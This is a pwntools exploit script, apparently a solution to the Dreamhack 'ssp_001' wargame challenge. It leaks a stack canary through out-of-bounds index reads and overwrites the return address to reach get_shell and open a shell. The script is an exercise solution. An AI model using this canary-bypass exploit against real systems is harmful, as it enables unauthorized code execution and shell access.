from operator import le
from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host1.dreamhack.games", 8772)
e = ELF("./ssp_001")

context.arch = "amd64"

canary = b""

for i in range(0, 4):
  p.sendlineafter("> ", "P")
  p.sendlineafter("Element index : ", str(128 + (3 - i)))
  p.recvuntil("is : ")
  canary += p.recv(2)
  slog("tmp: ", int(canary, 16))

canary = int(canary, 16)

slog("Canary: ", canary)

get_shell = e.symbols["get_shell"]

payload = b"A" * 64
payload += p32(canary)
payload += b"B" * 8
payload += p32(get_shell)

p.sendline(b"E")
p.recvuntil("Size : ")

p.sendline(str(len(payload)))
p.recvuntil("Name : ")

p.sendline(payload)

p.interactive()